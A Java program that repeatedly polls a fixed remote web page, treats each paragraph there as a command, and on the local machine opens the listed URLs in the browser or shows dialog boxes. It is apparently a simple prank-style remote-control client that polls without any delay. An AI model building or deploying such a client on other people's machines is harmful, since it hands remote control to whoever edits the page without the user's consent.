package com.soup;

import org.apache.commons.lang3.StringUtils;

import javax.swing.*;
import java.awt.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;

public class Main {

    public static void main(String[] args) {
        String initHtml = "";

        while(true) {
            String newHtml = grabHtml("https://cmd-mb2.wedeploy.io/index.html");

            if (!newHtml.equals(initHtml)) {
                initHtml = newHtml;
                ArrayList<String> paragraphs =
                        new ArrayList<String>(Arrays.asList(StringUtils.substringsBetween(newHtml, "<p>", "</p>")));

                ArrayList<Command> commands = new ArrayList<Command>();

                for (String p : paragraphs) {
                    commands.add(new Command(p));
                }

                runCommands(commands);
            }
        }

    }

    public static void runCommands(ArrayList<Command> commands) {
        for (Command command : commands) {
            System.out.println("Running: " + command);
            if (command.getCmd().equalsIgnoreCase("nothing")) {
                //don't do anything, lol
                System.out.println("doing nothing, lol");
            } else if (command.getCmd().equalsIgnoreCase("web")) {
                Desktop desktop = java.awt.Desktop.getDesktop();
                for (String sub : command.getSubs()) {
                    try {
                        desktop.browse(URI.create(sub)); } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            } else if (command.getCmd().equalsIgnoreCase("dialog")) {
                    if (command.getSubs().size() < 3) {
                        createDialog(command.getSubs().get(0));
                    } else {

                    }
                }
            }
        }

    public static void createDialog(String text) {
        JOptionPane.showMessageDialog(null, text);
    }

    public static void createDialog(String text, String title, int iconNo) {
        JOptionPane.showMessageDialog(null, text, title, iconNo);
    }

    public static String grabHtml(String url) {
        StringBuilder builder = new StringBuilder();
        try {
            URL oracle = new URL(url);
            BufferedReader in = new BufferedReader(
                    new InputStreamReader(oracle.openStream()));

            String inputLine;
            while ((inputLine = in.readLine()) != null)
                builder.append(inputLine + "\n");
            in.close();
        } catch (java.io.IOException e) {
            e.printStackTrace();
        }
        return builder.toString();
    }
}


